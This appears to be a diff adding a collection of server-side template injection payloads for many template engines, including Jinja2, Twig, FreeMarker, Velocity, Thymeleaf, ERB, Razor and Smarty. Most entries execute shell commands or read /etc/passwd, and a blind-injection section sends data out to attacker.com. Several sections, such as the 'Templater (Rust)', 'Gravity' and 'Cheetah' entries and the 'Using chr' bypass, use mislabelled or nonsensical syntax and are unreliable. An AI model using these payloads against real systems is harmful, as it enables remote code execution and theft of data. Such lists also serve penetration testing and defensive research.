@@ -1,0 +1,323 @@
+# SSTI Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: Server-Side Template Injection
+
+# ============================================
+# JINJA2 (PYTHON)
+# ============================================
+
+# Basic injection
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{request}}
+{{request.application.__globals__}}
+{{request.__class__.__mro__[2].__subclasses__()}}
+{{url_for.__globals__}}
+{{get_flashed_messages.__globals__}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+
+# Read file
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').readlines()}}
+
+# RCE
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+
+# Template manipulation
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+{% for b in c.__iter__().func_globals.values() %}
+{% if b.__class__ == {}.__class__ %}
+{% if 'eval' in b.keys() %}
+{{ b['eval']('__import__("os").popen("id").read()') }}
+{% endif %}
+{% endif %}
+{% endfor %}
+{% endif %}
+{% endfor %}
+
+# ============================================
+# TWIG (PHP)
+# ============================================
+
+{{7*7}}
+{{7*'7'}}
+{{_self}}
+{{_self.env}}
+{{_self.env.getTemplate('base').getParameter('test')}}
+
+# RCE
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.loadTemplate('base').getParameter('test')}}
+
+# File read
+{{'/etc/passwd'|file_excerpt(1,10)}}
+
+# Debug
+{{dump(app)}}
+{{dump(_context)}}
+
+# ============================================
+# FREEMARKER (JAVA)
+# ============================================
+
+${7*7}
+${"freemarker.template.utility.Execute"?new()("id")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().toString()}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+
+# File read
+${user.getClass().getResource("/etc/passwd").getContent()?substring(0,100)}
+
+# ============================================
+# VELOCITY (JAVA)
+# ============================================
+
+# RCE
+#set($x = '')
+#set($rt = $x.class.forName('java.lang.Runtime').getRuntime())
+#set($out = $rt.exec('id'))
+#set($in = $out.getInputStream())
+#set($b = $in.read())
+#set($str = '')
+#foreach($i in [1..$b])
+#set($str = $str + $b)
+#end
+$str
+
+# Alternative
+${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getRuntime(),"id")}
+
+# ============================================
+# THYMELEAF (JAVA)
+# ============================================
+
+__${T(java.lang.Runtime).getRuntime().exec('id')}__
+__${T(java.lang.ProcessBuilder).start()}__
+
+# Expression execution
+{{T(java.lang.Runtime).getRuntime().exec('id')}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+# ============================================
+# ERB (RUBY)
+# ============================================
+
+<%= 7*7 %>
+<%= system('id') %>
+<%= `id` %>
+<%= File.read('/etc/passwd') %>
+<%= Dir.entries('/') %>
+<%= ENV.to_h %>
+<%= IO.read('/etc/passwd') %>
+
+# ============================================
+# HANDLEBARS (JS)
+# ============================================
+
+{{#with "s" as | s |}}
+{{#with (eval.constructor.return(eval("global.process.mainModule.require('child_process').execSync('id')")))}}{{/with}}
+{{/with}}
+
+# ============================================
+# DOTNET / RAZOR
+# ============================================
+
+@{
+    var process = new System.Diagnostics.Process();
+    process.StartInfo.FileName = "cmd.exe";
+    process.StartInfo.Arguments = "/c id";
+    process.StartInfo.UseShellExecute = false;
+    process.StartInfo.RedirectStandardOutput = true;
+    process.Start();
+    var output = process.StandardOutput.ReadToEnd();
+    Response.Write(output);
+}
+
+@System.Diagnostics.Process.Start("cmd","/c id")
+
+# ============================================
+# TEMPLATER (RUST)
+# ============================================
+
+#{system("id")}
+
+# ============================================
+# SMARTY (PHP)
+# ============================================
+
+{php}system('id');{/php}
+{php}echo `id`;{/php}
+{system('id')}
+{exec('id')}
+
+# File read
+{file_get_contents('/etc/passwd')}
+
+# Config
+{$smarty.config}
+
+# ============================================
+# PLAINTEXT
+# ============================================
+
+*T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())*
+
+# ============================================
+# MVEL (JAVA)
+# ============================================
+
+System.exec("id")
+
+# ============================================
+# GROOVY
+# ============================================
+
+${new ProcessBuilder('id').start()}
+
+# ============================================
+# JADE / PUG (NODE.JS)
+# ============================================
+
+- var x = process
+- x.exec('id')
+
+# ============================================
+# EJS (JS)
+# ============================================
+
+<%- process.mainModule.require('child_process').execSync('id') %>
+
+# ============================================
+# HOGAN
+# ============================================
+
+{{#each this}}{{#each this}}{{this}}{{/each}}{{/each}}
+
+# ============================================
+# JADE
+# ============================================
+
+- var x = global.process.mainModule.require('child_process')
+- x.exec('id').stdout.toString()
+
+# ============================================
+# DOH
+# ============================================
+
+{{payload}}
+
+# ============================================
+# TEMPLER
+# ============================================
+
+#{`id`}
+
+# ============================================
+# STRINGIO
+# ============================================
+
+{{
+require('child_process').execSync('id').toString()
+}}
+
+# ============================================
+# PUG
+# ============================================
+
+- var x = global.process.mainModule.require('child_process')
+- x.exec('id').stdout.toString()
+
+# ============================================
+# JINJA / DJANGO
+# ============================================
+
+# Basic
+{{7*7}}
+{{config}}
+
+# Debug
+{% debug %}
+
+# List all
+{% for x in ().__class__.__bases__[0].__subclasses__() %}{{x}}{% endfor %}
+
+# ============================================
+# GRAVITY
+# ============================================
+
+{{execute("id")}}
+
+# ============================================
+# VELOCITY
+# ============================================
+
+#set($e="e")
+#set($exec=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
+#set($out=$exec.getInputStream())
+#set($b=new byte[1000])
+#set($len=$out.read($b))
+#set($s=new String($b,0,$len))
+$s
+
+# ============================================
+# CHEETAH
+# ============================================
+
+#set($cmd = 'id')
+#set($out = $cmd.execute())
+$out
+
+# ============================================
+# TT2
+# ============================================
+
+[% PERL %]
+system('id');
+[% END %]
+
+# ============================================
+# CACHING
+# ============================================
+
+# Redis
+{{'a'.join(().__class__.__bases__[0].__subclasses__()[:5])}}
+
+# Memcached
+{{request.application.__globals__}}
+
+# ============================================
+# BLIND SSTI
+# ============================================
+
+# Time-based
+{{request.application.__globals__['__builtins__']['__import__']('time').sleep(10)}}
+
+# DNS exfiltration
+{{request.application.__globals__['__builtins__']['__import__']('urllib').request.urlopen('http://attacker.com/'+request.application)}}
+
+# ============================================
+# FILTER BYPASS
+# ============================================
+
+# Using chr
+{{(asc|attr(request.args.class))[:__import__(__('string')).ascii_letters.index(request.args.char)+1:]}}
+
+# Using join
+{{(x|join)}}
+{{x|join}}
+
+# Using import
+{{__import__('os').popen('id').read()}}
+
+# Using base classes
+{{().__class__.__bases__[0].__subclasses__()}}
+
+# Using mro
+{{''.__class__.__mro__[2].__subclasses__()}}
+
